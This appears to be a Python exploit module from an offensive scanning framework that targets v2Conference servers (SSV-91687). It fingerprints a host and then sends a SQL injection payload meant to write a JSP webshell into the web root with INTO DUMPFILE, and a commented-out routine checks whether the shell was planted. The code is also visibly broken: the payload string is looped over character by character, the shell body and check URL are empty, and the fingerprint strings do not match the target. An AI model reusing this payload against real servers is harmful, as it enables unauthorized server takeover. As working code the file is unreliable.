# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

# coding=utf-8
from async_timeout import timeout
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.asynchttp import *


class Script(BaseScript):
    name = 'WEB NAME'

    def __init__(self, target, pbar, semaphore):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.SQLINJECTION
        # 编号
        self.bugNumber = 'SSV-91687'
        # 来源
        self.refer = 'https://www.seebug.org/vuldb/ssvid-91687'
        # payload
        self.payloadList = "/Conf/jsp/systembulletin/bulletinAction.do?operator=modify&sysId=1 UNION SELECT 1,2,3,4,0xinto dumpfile '../../management/webapps/root/V2ConferenceCmd.jsp'%23"
        # 特定路径判断
        self.detectPathList = ['/Conf/images/user.gif']
        # 进度条
        self.pbar = pbar
        # 信号量
        self.semaphore = semaphore
        # http://122.228.226.68:18080/Conf/images/user.gif

    async def detect(self):
        for detectPath in self.detectPathList:
            url = f'http://{self.target}{detectPath}' if self.target.startswith(
                ('http:', 'https:')) is False else f'{self.target}{detectPath}'
            try:
                async with self.semaphore:
                    with timeout(15):
                        async with aiohttp.ClientSession() as session:
                            text = await AsyncFetcher.fetch(session=session, url=url)
                            if 'FineReport--Web Reporting Tool' in text:
                                tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url))
                                self.flag = True
                                return {'name': 'v2Conference Finger', 'url': url, 'software': 'v2Conference'}
            except Exception:
                pass

    async def exploit(self):
        for payload in self.payloadList:
            url = f'http://{self.target}{payload}' if self.target.startswith(
                ('http:', 'https:')) is False else f'{self.target}{payload}'
            async with aiohttp.ClientSession() as session:
                text = await AsyncFetcher.fetch(session=session, url=url)
            url2 = ''
            async with aiohttp.ClientSession() as session:
                text2 = await AsyncFetcher.fetch(session=session, url=url2)
                if 'It works!' in text:
                    tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url2))
                    self.flag = True
                    return {'name': 'v2Conference Getshell', 'url': url2, 'software': 'v2Conference'}

    async def attack(self):
        a = await self.detect()
        self.vulList.append(a)
        if self.flag:
            b = await self.exploit()
            self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList

    # def attack(self):
    #     check_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '/V2ConferenceCmd.jsp', '', '', ''))
    #     temp = urlunparse((urlinfo.scheme, urlinfo.netloc, '', '', '', ''))
    #     exp_url = temp + exp
    #     try:
    #         var = "[checking] " + url
    #         req = requests.session()
    #         resp_one = req.get(exp_url, timeout=5)
    #         time.sleep(1)
    #         if resp_one.status_code == 200:
    #             resp_two = req.get(check_url, timeout=5)
    #             if resp_two.status_code == 200 and "It works!" in resp_two.content:
    #                 print("[getshell success]")
    #                 print("SHELL: " + check_url)
    #                 return
    #         print(u"getshell failed...")
    #         return
    #     except Exception as e:
    #         print("Failed to connection target, try again..")
